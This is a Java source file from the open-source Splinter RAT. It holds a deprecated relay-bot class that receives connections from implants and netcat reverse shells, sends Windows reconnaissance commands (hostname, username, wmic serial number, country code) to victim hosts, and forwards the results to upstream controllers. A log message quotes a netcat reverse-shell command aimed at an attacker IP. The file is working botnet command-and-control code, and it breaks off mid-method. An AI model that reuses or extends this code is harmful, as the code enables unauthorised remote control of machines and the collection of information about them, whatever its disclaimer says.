/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/



package RelayBot;

import Implant.Driver;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Vector;
import javax.swing.Timer;

public class DEPRECATED_RelayBot_AgentConnectedToRelayBot extends Thread
  implements Runnable, ActionListener
{
  String strMyClassName = "RelayBot_AgentConnectedToRelayBot";

  private Vector<String> vctMyRowData = new Vector();

  private BufferedReader brIn_ConnectedAgent = null;
  private PrintWriter pwOut_ConnectedAgent = null;
  public Socket sktMyConnection_ConnectedAgent = null;

  public volatile boolean dataAcquisitionComplete = false;
  public static final String WINDOWS_COMMAND_PROMPT_HEADER_STRING = "[Version";
  public static final String NEWER_VERSION_OF_CMD_PROMPT_HEADER_STRING = "Copyright (c)";
  public static final String OLDER_VERSION_OF_CMD_PROMPT_HEADER_STRING = "(C) Copyright";
  long myThread_ID = getId();
  int myIMPLANT_ID = 0;

  public volatile boolean I_am_Disconnected_From_Implant = false;

  public volatile long myRandomIdentifier = 0L;

  String myLocalControllerPort = ""; String myLocalController_IP = ""; String myVictim_RHOST_IP = ""; String myRemote_RHOST_Port = "";
  String I_have_an_important_message = " ";

  String myImplantName = "UNKNOWN";
  String myImplantInitialLaunchDirectory = "";
  String myBinaryFileName = "UNKNOWN";
  String myHostName = "";
  String myOS = "";
  String myOS_Shortcut = "";
  String myServicePack = "";
  String myUserName = "";
  String myUserDomain = "";
  String myHomeDrive = "";
  String myProcessorArchitecture = "";
  String myCountryCode = "";
  String myNumberOfUsers = "";
  String myOS_Architecture = "";
  String mySerialNumber = "";
  String myVersionNumber = "";
  String myNumberOfProcessors = "";
  String myOS_Type = "";
  String mySystemRoot = "";
  String myUserProfile = "";
  String myTempPath = "";
  String myDisconnectionTime = "";
  String myUniqueDelimiter = "";

  public String myFullGeoData = "GEO Data Not Queried on Relay";

  public volatile boolean continueRun = false;
  public volatile boolean killThread = false;

  public volatile ArrayList<String> alReceivedLine = new ArrayList();
  public volatile boolean processInterrupt = true;
  public Timer tmrReadLine = null;
  String inputLine = "";
  public volatile boolean closingRunningProcessFrame = false;

  public volatile boolean pauseRunningProcessUpdate = false;

  public String myCurrentWorkingDirectory = " > ";

  public volatile ArrayList<DEPRECATED_RelayBot_ForwardConnectionThread> alForwardControllers = new ArrayList();

  public DEPRECATED_RelayBot_AgentConnectedToRelayBot(Socket skt)
  {
    this.sktMyConnection_ConnectedAgent = skt;
  }

  public void run()
  {
    try
    {
      Driver.sop("In thread ID: " + getId());

      Driver.sop("In thread: " + this.myThread_ID + ".  Attempting to open streams on socket...");

      this.brIn_ConnectedAgent = new BufferedReader(new InputStreamReader(this.sktMyConnection_ConnectedAgent.getInputStream()));

      this.pwOut_ConnectedAgent = new PrintWriter(new BufferedOutputStream(this.sktMyConnection_ConnectedAgent.getOutputStream()));

      Driver.sop("Streams opened");

      this.myLocalControllerPort = this.sktMyConnection_ConnectedAgent.getLocalAddress().toString();
      this.myLocalController_IP = ""+this.sktMyConnection_ConnectedAgent.getLocalPort();
      this.myVictim_RHOST_IP = this.sktMyConnection_ConnectedAgent.getInetAddress().toString();
      Driver.sop(this.sktMyConnection_ConnectedAgent.getInetAddress().toString());
      Driver.sop(this.sktMyConnection_ConnectedAgent.getLocalAddress().toString());
      Driver.sop(this.sktMyConnection_ConnectedAgent.getLocalSocketAddress().toString());
      this.myRemote_RHOST_Port = ""+this.sktMyConnection_ConnectedAgent.getPort();

      this.continueRun = true;

      if (Driver.acquireAgentOverheadData)
      {
        acquireOverheadData(this.brIn_ConnectedAgent, this.pwOut_ConnectedAgent);

        Driver.sop("Overhead of Data Aquisition complete for this thread ID: " + this.myThread_ID + ".");

        connectToForwardControllerIfApplicable();
      }

      if (this.myIMPLANT_ID == 1)
      {
        do
        {
          if ((this.inputLine != null) && (!this.inputLine.trim().equals("")))
          {
            if ((this.inputLine.trim().startsWith("[RELAY_MESSAGE_TO_FORWARD_CONTROLLER]")) || (this.inputLine.trim().startsWith(this.myUniqueDelimiter)))
            {
              if (!determineCommand(this.inputLine))
              {
                sendResponseToForwardController(this.inputLine);
              }

            }
            else
            {
              sendResponseToForwardController(this.inputLine);
            }
          }
          if ((!this.continueRun) || (this.killThread) || (this.sktMyConnection_ConnectedAgent.isClosed()) || ((this.inputLine = this.brIn_ConnectedAgent.readLine()).equals("disconnectImplant"))) break;  } while (this.inputLine != null);
      }
      else
      {
        if ((this.tmrReadLine != null) && (this.tmrReadLine.isRunning()))
        {
          try
          {
            this.tmrReadLine.stop();
          } catch (Exception localException1) {
          }
        }
        this.processInterrupt = false;
        this.tmrReadLine = new Timer(10, this);
        this.tmrReadLine.start();
        do
        {
          if ((this.inputLine != null) && (!this.inputLine.trim().equals("")))
          {
            this.alReceivedLine.add(this.inputLine);

            this.processInterrupt = true;
          }
          if ((!this.continueRun) || (this.killThread) || (this.sktMyConnection_ConnectedAgent.isClosed()) || ((this.inputLine = this.brIn_ConnectedAgent.readLine()).equals("disconnectImplant"))) break;  } while (this.inputLine != null);
      }

    }
    catch (Exception e)
    {
      Driver.sop("Thread ID: " + this.myThread_ID + ": Streams (and socket) are closed for this socket.  If possible, attempt for implant to reconnect");
    }

    try
    {
      sendCommand_RAW_ToAgent(this.inputLine);
    } catch (Exception localException2) {
    }
    cleanThreadAndClose();
  }

  public void actionPerformed(ActionEvent ae)
  {
    try
    {
      if (ae.getSource() == this.tmrReadLine)
      {
        try
        {
          if ((!this.continueRun) || (this.killThread) || (this.sktMyConnection_ConnectedAgent.isClosed()))
          {
            closeThread();
          }
        }
        catch (Exception localException1) {
        }
        if ((this.alReceivedLine != null) && (this.alReceivedLine.size() > 0))
        {
          this.processInterrupt = false;
          readLineFromSocket();
        }

      }

    }
    catch (Exception e)
    {
      Driver.eop("AE", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }
  }

  public boolean cleanThreadAndClose()
  {
    try
    {
      this.continueRun = false;
      this.I_am_Disconnected_From_Implant = true;

      this.myDisconnectionTime = Driver.getTimeStamp_Without_Date();
      if (this.myDisconnectionTime == null)
      {
        this.myDisconnectionTime = "";
      }

      try
      {
        this.tmrReadLine.stop();
      }
      catch (Exception localException1)
      {
      }

      for (int i = 0; i < this.alForwardControllers.size(); i++)
      {
        ((DEPRECATED_RelayBot_ForwardConnectionThread)this.alForwardControllers.get(i)).sktMyConnection.close();
      }

      this.I_am_Disconnected_From_Implant = true;
      this.killThread = true;

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("cleanThreadAndClose", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean readLineFromSocket()
  {
    try
    {
      if ((this.alReceivedLine == null) || (this.alReceivedLine.size() < 1))
      {
        return false;
      }

      this.inputLine = ((String)this.alReceivedLine.remove(0));

      if (this.inputLine == null)
      {
        throw new SocketException("Socket Appears to Be Closed");
      }

      if ((this.inputLine.trim().startsWith("[SPLINTER_IMPLANT]")) || (this.inputLine.trim().startsWith(this.myUniqueDelimiter)))
      {
        if (!determineCommand(this.inputLine))
        {
          sendResponseToForwardController(this.inputLine);
        }

        this.processInterrupt = true;
        return true;
      }

      sendResponseToForwardController(this.inputLine);

      this.processInterrupt = true;
      return true;
    }
    catch (SocketException se)
    {
      Driver.sop("Socket detected in " + this.strMyClassName + " has returned value expected from a closed socket. Perhaps implant has disconnected abruptly.  Cleaning up thread...");
    }
    catch (Exception e)
    {
      Driver.eop("readLineFromSocket", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean sendResponseToForwardController(String inputLine)
  {
    try
    {
      if ((this.alForwardControllers != null) && (this.alForwardControllers.size() > 0) && (inputLine != null))
      {
        for (int i = 0; i < this.alForwardControllers.size(); i++)
        {
          try
          {
            ((DEPRECATED_RelayBot_ForwardConnectionThread)this.alForwardControllers.get(i)).sendToController_Or_Next_Relay(inputLine, false);
          }
          catch (Exception localException1)
          {
          }

        }

      }

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("sendResponseToForwardController", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public boolean removeForwardConnectionThread(DEPRECATED_RelayBot_ForwardConnectionThread threadToRemove, long threadID_ToRemove)
  {
    try
    {
      if ((this.alForwardControllers == null) || (this.alForwardControllers.size() < 1))
      {
        Driver.sop("ArrayList is empty. No clients further to remove");
        return false;
      }

      if (this.alForwardControllers.contains(threadToRemove))
      {
        this.alForwardControllers.remove(threadToRemove);
      }

      return true;
    }
    catch (Exception e)
    {
      Driver.sop("Exception handled when removing thread id: " + threadID_ToRemove + " in RelayBot_ServerSocket");
    }

    return false;
  }

  private boolean determineCommand(String line)
  {
    try
    {
      if ((line == null) || (line.trim().equals("")))
      {
        return false;
      }

      if (line.startsWith("[SPLINTER_IMPLANT]"))
      {
        this.myIMPLANT_ID = 2;
        try { this.myImplantName = Driver.ARR_IMPLANT_NAME[this.myIMPLANT_ID]; } catch (Exception e) { this.myImplantName = "UNKNOWN"; }

        Driver.sop("-->>>> Ooooohhh Joy! Looks like we have a " + this.myImplantName + " connected!  -->>>> confidence: 100%.  Setting up the environment to handle this type of implant");
        try
        {
          line = line.replace("[SPLINTER_IMPLANT]", "");
        } catch (Exception localException1) {
        }
        String[] arrAgent = line.split("%%%%%");

        this.myImplantInitialLaunchDirectory = arrAgent[0];
        this.myHostName = arrAgent[1];
        this.myOS = arrAgent[2];
        this.myOS_Type = arrAgent[3];
        this.myUserName = arrAgent[4];
        this.myUserDomain = arrAgent[5];
        this.myTempPath = arrAgent[6];
        this.myUserProfile = arrAgent[7];
        this.myProcessorArchitecture = arrAgent[8];
        this.myNumberOfProcessors = arrAgent[9];
        this.mySystemRoot = arrAgent[10];

        this.myServicePack = arrAgent[11];
        this.myNumberOfUsers = arrAgent[12];
        this.mySerialNumber = arrAgent[13];
        this.myOS_Architecture = arrAgent[14];
        this.myCountryCode = arrAgent[15];
        this.myVersionNumber = arrAgent[16];
        this.myHomeDrive = arrAgent[17];

        this.myRandomIdentifier = Driver.getUniqueRandomNumber();

        this.myUniqueDelimiter = ("[SPLINTER_IMPLANT@" + this.myRandomIdentifier + "]");

        sendCommand_RAW_ToAgent(""+this.myRandomIdentifier);

        sendCommand_RAW_ToAgent("[SPLINTER_IMPLANT]%%%%%[RELAY_NOTIFICATION_YOU_ARE_CONNECTED_TO_RELAY]");

        return true;
      }

      if (line.startsWith(this.myUniqueDelimiter))
      {
        return false;
      }

      return false;
    }
    catch (Exception e)
    {
      Driver.eop("determineCommand", this.strMyClassName, e, e.getLocalizedMessage(), false);
      Driver.sop("Geez!!!!  Missed it by that much. Authentication failed for this implant... invalid parameters passed in");

      this.myIMPLANT_ID = 0;
      try { this.myImplantName = Driver.ARR_IMPLANT_NAME[this.myIMPLANT_ID]; } catch (Exception ee) { this.myImplantName = "UNKNOWN"; }


    }

    return false;
  }

  public boolean connectToForwardControllerIfApplicable()
  {
    

    return false;
  }

  private boolean acquireOverheadData(BufferedReader brSocket, PrintWriter pwSocket)
  {
    try
    {
      acquireOverheadData_WINDOWS(brSocket, pwSocket);

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("acquireOverheadData", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  private boolean acquireOverheadData_WINDOWS(BufferedReader brSocket, PrintWriter pwSocket)
  {
    this.dataAcquisitionComplete = true;
    String strFirstLine = "";
    try
    {
      Driver.sop("\nAttempting to interrogate connected implant to determine agent type...");

      strFirstLine = brSocket.readLine();

      if ((strFirstLine != null) && (strFirstLine.trim().startsWith("[SPLINTER_IMPLANT]")))
      {
        if (!determineCommand(strFirstLine))
        {
          throw new UnsupportedOperationException("Unknown Agent Connected");
        }

        this.I_have_an_important_message = "";
        RelayBot_ServerSocket.updateConnectedImplants();
        this.dataAcquisitionComplete = true;
        return true;
      }

      if ((strFirstLine != null) && (strFirstLine.contains("[Version")))
      {
        Driver.sop("-> Interesting. It appears I am connected to a backdoor that binds to cmd.exe similar to executing the command: nc.exe [Attacker IP] [Attacker Port] -e cmd.exe.  Perhaps this is a netcat implant --> Confidence level for netcat: 25% --> I am launching the netcat_windows subroutine to configure the environment...");

        String strSecondLine = brSocket.readLine();

        if ((strSecondLine != null) && (strSecondLine.contains("Copyright (c)")))
        {
          Driver.sop("-->> This is good. It appears it is a netcat implant -->> Confidence level for netcat: 50% ...");

          if (interrogateNewAgent_NETCAT_NEWER(brSocket))
          {
            RelayBot_ServerSocket.updateConnectedImplants();
            this.dataAcquisitionComplete = true;
            this.I_have_an_important_message = "";
            return true;
          }

          throw new UnsupportedOperationException("Unknown Agent Connected");
        }

        if ((strSecondLine != null) && (strSecondLine.contains("(C) Copyright")))
        {
          Driver.sop("-->> Geez! Older version of Windows Command Prompt Detected! -->> Confidence level for netcat: 50% ...");

          if (interrogateNewAgent_NETCAT_OLDER(brSocket))
          {
            RelayBot_ServerSocket.updateConnectedImplants();
            this.dataAcquisitionComplete = true;
            this.I_have_an_important_message = "";
            return true;
          }

          throw new UnsupportedOperationException("Unknown Agent Connected");
        }

      }
      else
      {
        throw new UnsupportedOperationException("Unknown Agent Connected");
      }

      this.I_have_an_important_message = "";
      RelayBot_ServerSocket.updateConnectedImplants();
      this.dataAcquisitionComplete = true;

      return true;
    }
    catch (UnsupportedOperationException uoe)
    {
      Driver.sop("Interrogation to this system failed (Thread ID: " + this.myThread_ID + ").  First Line returned: \"" + strFirstLine + "\" I can not determine the type of agent connected.  However, you might still be able to correspond with the agent!");

      pwSocket.println("");
    }
    catch (SocketException se)
    {
      Driver.sop("Well then!!!  Socket closed abruptly - I am disposing of this thread meant to corresponsd with the implant");
      this.continueRun = false;
    }
    catch (Exception e)
    {
      Driver.eop("acquireOverheadData_WINDOWS", this.strMyClassName, e, e.getLocalizedMessage(), false);

      Driver.sop("Interrogation to this system failed Thread ID: [" + this.myThread_ID + "].  First Line returned: \"" + strFirstLine + "\" I can not determine the type of agent connected.  However, you might still be able to correspond with the agent!");

      pwSocket.println("");
    }

    this.dataAcquisitionComplete = true;
    this.I_have_an_important_message = "";
    RelayBot_ServerSocket.updateConnectedImplants();
    return false;
  }

  public boolean interrogateNewAgent_NETCAT_NEWER(BufferedReader brSocket)
  {
    try
    {
      String strThirdLine = brSocket.readLine();

      if ((strThirdLine != null) && (strThirdLine.trim().equals("")))
      {
        Driver.sop("-->>> Almost there... Confidence level for netcat: 75% ...");

        sendCommand_RAW_ToAgent("");

        String strFourthLine = brSocket.readLine();

        if ((strFourthLine != null) && (strFourthLine.trim().endsWith(">")))
        {
          Driver.sop("-->>>> OK. So as best as I can tell, this is a netcat agent. I will label this implant netcat -->>>> Confidence level for netcat: 100% -->>>> I am sending commands to better interrogate the system now...");

          this.myIMPLANT_ID = 1;
          try { this.myImplantName = Driver.ARR_IMPLANT_NAME[this.myIMPLANT_ID]; } catch (Exception e) { this.myImplantName = "UNKNOWN"; }


          this.myImplantInitialLaunchDirectory = strFourthLine;

          brSocket.readLine();
        }

      }

      sendCommand_RAW_ToAgent("hostname");
      brSocket.readLine();
      this.myHostName = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %username%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myUserName = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %homedrive%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myHomeDrive = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %NUMBER_OF_PROCESSORS%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myNumberOfProcessors = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %OS%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myOS_Type = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %PROCESSOR_ARCHITECTURE%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myProcessorArchitecture = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %SystemRoot%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.mySystemRoot = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %USERDOMAIN%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myUserDomain = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %USERPROFILE%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myUserProfile = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %TEMP%");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myTempPath = brSocket.readLine();

      sendCommand_RAW_ToAgent("wmic os get caption /value");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myOS = brSocket.readLine();
      try { this.myOS = this.myOS.replace("Caption=", ""); } catch (Exception localException1) {
      }
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();

      sendCommand_RAW_ToAgent("wmic os get CSDVersion /value");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myServicePack = brSocket.readLine();
      try { this.myServicePack = this.myServicePack.replace("CSDVersion=", ""); }
      catch (Exception localException2)
      {
      }
      sendCommand_RAW_ToAgent("wmic os get CountryCode /value");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myCountryCode = brSocket.readLine();
      try { this.myCountryCode = this.myCountryCode.replace("CountryCode=", ""); }
      catch (Exception localException3)
      {
      }
      sendCommand_RAW_ToAgent("wmic os get NumberOfUsers /value");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myNumberOfUsers = brSocket.readLine();
      try { this.myNumberOfUsers = this.myNumberOfUsers.replace("NumberOfUsers=", ""); }
      catch (Exception localException4)
      {
      }

      sendCommand_RAW_ToAgent("wmic os get Version /value");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myVersionNumber = brSocket.readLine();
      try { this.myVersionNumber = this.myVersionNumber.replace("Version=", ""); }
      catch (Exception localException5)
      {
      }

      sendCommand_RAW_ToAgent("wmic os get SerialNumber /value");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.mySerialNumber = brSocket.readLine();
      try { this.mySerialNumber = this.mySerialNumber.replace("SerialNumber=", "");
      } catch (Exception localException6) {
      }
      sendCommand_RAW_ToAgent("wmic os get OSArchitecture /value");
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      brSocket.readLine();
      this.myOS_Architecture = brSocket.readLine();
      try { this.myOS_Architecture = this.myOS_Architecture.replace("OSArchitecture=", ""); } catch (Exception localException7) {
      }
      return true;
    }
    catch (Exception e)
    {
      Driver.eop("interrogateNewAgent_NETCAT", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  private boolean deprecated_acquireOverheadData_WINDOWS(BufferedReader brSocket, PrintWriter pwSocket)
  {
    this.dataAcquisitionComplete = false;
    try
    {
      sendCommand_RAW_ToAgent("hostname");
      this.myHostName = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %username%");
      this.myUserName = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %homedrive%");
      this.myHomeDrive = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %NUMBER_OF_PROCESSORS%");
      this.myNumberOfProcessors = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %OS%");
      this.myOS_Type = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %PROCESSOR_ARCHITECTURE%");
      this.myProcessorArchitecture = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %SystemRoot%");
      this.mySystemRoot = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %USERDOMAIN%");
      this.myUserDomain = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %USERPROFILE%");
      this.myUserProfile = brSocket.readLine();

      sendCommand_RAW_ToAgent("echo %TEMP%");
      this.myTempPath = brSocket.readLine();

      sendCommand_RAW_ToAgent("wmic os get caption /value");
      this.myOS = brSocket.readLine();
      try { this.myOS.replace("Caption=", ""); }
      catch (Exception localException1)
      {
      }
      sendCommand_RAW_ToAgent("wmic os get CSDVersion /value");
      this.myServicePack = brSocket.readLine();
      try { this.myServicePack.replace("CSDVersion=", ""); }
      catch (Exception localException2)
      {
      }
      sendCommand_RAW_ToAgent("wmic os get CountryCode /value");
      this.myCountryCode = brSocket.readLine();
      try { this.myCountryCode.replace("CountryCode=", ""); }
      catch (Exception localException3)
      {
      }
      sendCommand_RAW_ToAgent("wmic os get NumberOfUsers /value");
      this.myNumberOfUsers = brSocket.readLine();
      try { this.myNumberOfUsers.replace("NumberOfUsers=", ""); }
      catch (Exception localException4)
      {
      }
      sendCommand_RAW_ToAgent("wmic os get Version /value");
      this.myVersionNumber = brSocket.readLine();
      try { this.myVersionNumber.replace("Version=", ""); }
      catch (Exception localException5)
      {
      }
      sendCommand_RAW_ToAgent("wmic os get SerialNumber /value");
      this.mySerialNumber = brSocket.readLine();
      try { this.myVersionNumber.replace("SerialNumber=", ""); }
      catch (Exception localException6)
      {
      }
      sendCommand_RAW_ToAgent("wmic os get OSArchitecture /value");
      this.myOS_Architecture = brSocket.readLine();
      try { this.myOS_Architecture.replace("OSArchitecture=", ""); } catch (Exception localException7) {
      }
      RelayBot_ServerSocket.updateConnectedImplants();

      this.dataAcquisitionComplete = true;
      return true;
    }
    catch (Exception e)
    {
      Driver.eop("acquireOverheadData_WINDOWS", this.strMyClassName, e, e.getLocalizedMessage(), false);

      RelayBot_ServerSocket.updateConnectedImplants();
      this.dataAcquisitionComplete = true;
    }return false;
  }

  public String getThreadID() {
    return "_" + getId();
  }

  public String getJListData()
  {
    try {
      if ((this.myOS != null) && (!this.myOS.trim().equals("")))
      {
        return this.myOS_Shortcut + "_[" + getId() + "]_ " + this.myVictim_RHOST_IP;
      }

      if ((this.myOS_Type != null) && (!this.myOS_Type.trim().equals("")))
      {
        return this.myOS_Type + "_[" + getId() + "]_ " + this.myVictim_RHOST_IP;
      }

      return getId() + "@" + this.myVictim_RHOST_IP;
    }
    catch (Exception localException)
    {
    }

    return "ID: " + getId();
  }

  public String getHandShakeRowData()
  {
    try
    {
      Vector vctData = getJTableRowData();
      String handShake = (String)vctData.get(0);
      for (int i = 1; i < vctData.size(); i++)
      {
        handShake = "%%%%%" + (String)vctData.get(i);
      }

      return handShake;
    }
    catch (Exception e)
    {
      Driver.eop("getHandShakeRowData", this.strMyClassName, e, e.getLocalizedMessage(), false);
    }

    return "UNKNOWN";
  }

  public Vector<String> getJTableRowData() {
    try {
      this.vctMyRowData.clear();
    } catch (Exception localException) {
    }
    if ((this.myOS == null) || (this.myOS.trim().equals(""))) {
      this.myOS = this.myOS_Type;
    }

    if ((this.myImplantInitialLaunchDirectory == null) || (this.myImplantInitialLaunchDirectory.trim().equals("")))
    {
      this.myImplantInitialLaunchDirectory = ("." + Driver.fileSeperator);
    }
    else if (!this.myImplantInitialLaunchDirectory.endsWith(Driver.fileSeperator))
    {
      try
      {
        if (this.myImplantInitialLaunchDirectory.substring(this.myImplantInitialLaunchDirectory.length() - 5).contains("."))
        {
          this.myBinaryFileName = this.myImplantInitialLaunchDirectory.substring(this.myImplantInitialLaunchDirectory.lastIndexOf(Driver.fileSeperator) + 1);

          this.myImplantInitialLaunchDirectory = this.myImplantInitialLaunchDirectory.substring(0, this.myImplantInitialLaunchDirectory.lastIndexOf(Driver.fileSeperator));
        }
      }
      catch (Exception localException1) {
      }
      this.myImplantInitialLaunchDirectory += Driver.fileSeperator;

      if ((this.myImplantInitialLaunchDirectory != null) && (this.myImplantInitialLaunchDirectory.endsWith(Driver.fileSeperator)))
      {
        this.myCurrentWorkingDirectory = (this.myImplantInitialLaunchDirectory.substring(0, this.myImplantInitialLaunchDirectory.lastIndexOf(Driver.fileSeperator)).trim() + ">" + " ");
      }
      else
      {
        this.myCurrentWorkingDirectory = (this.myImplantInitialLaunchDirectory.trim() + ">" + " ");
      }

    }

    if (this.I_am_Disconnected_From_Implant)
    {
      this.vctMyRowData.add(this.myDisconnectionTime);
    }
    else
    {
      this.vctMyRowData.add(this.I_have_an_important_message);
    }

    if (((this.myOS_Shortcut == null) || (this.myOS_Shortcut.trim().equals(""))) && (this.myOS != null))
    {
      if (this.myOS.trim().toUpperCase().startsWith("MICROSOFT WINDOWS 7 PRO"))
      {
        this.myOS_Shortcut = "Win 7 Pro";
      }
      else
      {
        this.myOS_Shortcut = this.myOS;
      }
    }

    this.vctMyRowData.add(""+getId());
    this.vctMyRowData.add(this.myFullGeoData);
    this.vctMyRowData.add(this.myImplantName);
    this.vctMyRowData.add(RelayBot_ServerSocket.careOfAddress);
    this.vctMyRowData.add(this.myImplantInitialLaunchDirectory);
    this.vctMyRowData.add(this.myBinaryFileName);
    this.vctMyRowData.add(this.myVictim_RHOST_IP);
    this.vctMyRowData.add(this.myHostName);
    this.vctMyRowData.add(this.myOS);
    this.vctMyRowData.add(this.myOS_Type);
    this.vctMyRowData.add(this.myUserName);
    this.vctMyRowData.add(this.myUserDomain);
    this.vctMyRowData.add(this.myTempPath);
    this.vctMyRowData.add(this.myUserProfile);
    this.vctMyRowData.add(this.myProcessorArchitecture);
    this.vctMyRowData.add(this.myNumberOfProcessors);
    this.vctMyRowData.add(this.mySystemRoot);
    this.vctMyRowData.add(this.myServicePack);
    this.vctMyRowData.add(this.myNumberOfUsers);
    this.vctMyRowData.add(this.mySerialNumber);
    this.vctMyRowData.add(this.myOS_Architecture);
    this.vctMyRowData.add(this.myCountryCode);
    this.vctMyRowData.add(this.myHomeDrive);
    this.vctMyRowData.add(this.myVersionNumber);

    return this.vctMyRowData;
  }

  public String getRHOST_IP()
  {
    return this.myVictim_RHOST_IP;
  }

  public boolean sendCommand_RAW_ToAgent(String cmdToSend)
  {
    try
    {
      this.pwOut_ConnectedAgent.println(cmdToSend);
      this.pwOut_ConnectedAgent.flush();

      return true;
    }
    catch (Exception e)
    {
      Driver.eop("Thread ID: " + this.myThread_ID + " sendCommand_RAW", this.strMyClassName, e, e.getLocalizedMessage() + "...Perhaps socket is closed...", false);
    }

    return false;
  }

  public boolean closeThread()
  {
    try
    {
      this.continueRun = false;
      this.I_am_Disconnected_From_Implant = true;
      this.killThread = true;

      this.myDisconnectionTime = Driver.getTimeStamp_Without_Date();
      if (this.myDisconnectionTime == null)
      {
        this.myDisconnectionTime = "";
      }

      try
      {
        this.tmrReadLine.stop();
      }
      catch (Exception localException)
      {
      }
    }
    catch (Exception localException1)
    {
    }

    return false;
  }

  public boolean interrogateNewAgent_NETCAT_OLDER(BufferedReader brSocket)
  {
    try
    {
      String strThirdLine = brSocket.readLine();

      if ((strThirdLine != null) && (strThirdLine.trim().equals("")))
      {
        Driver.sop("-->>> Almost there... Confidence level is 75% ...");

